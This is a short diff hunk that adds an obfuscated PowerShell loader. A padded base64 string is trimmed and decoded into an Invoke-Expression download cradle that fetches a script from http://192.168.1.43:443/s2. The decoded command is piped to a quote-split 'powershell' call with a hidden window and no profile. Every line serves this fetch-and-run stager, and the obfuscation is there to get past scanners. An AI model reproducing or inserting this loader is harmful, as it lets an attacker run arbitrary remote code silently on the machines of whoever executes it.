@@ -1,0 +1,4 @@
+$phil1 = "aU52b0tlLWV4UFJFc3NpT24gKE5ldy1PQmpFQ3QgTmVULndlQmNsSUVOdCkuZE9XbkxvQWRzdFJJTmcoJ2h0dHA6Ly8xOTIuMTY4LjEuNDM6NDQzL3MyJyk=kyop"
+$phil2 = $phil1.substring(0,120)
+$upgrade_phil1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($phil2))
+echo $upgrade_phil1 | pow""e""rsh""ell -nop -window hidden -
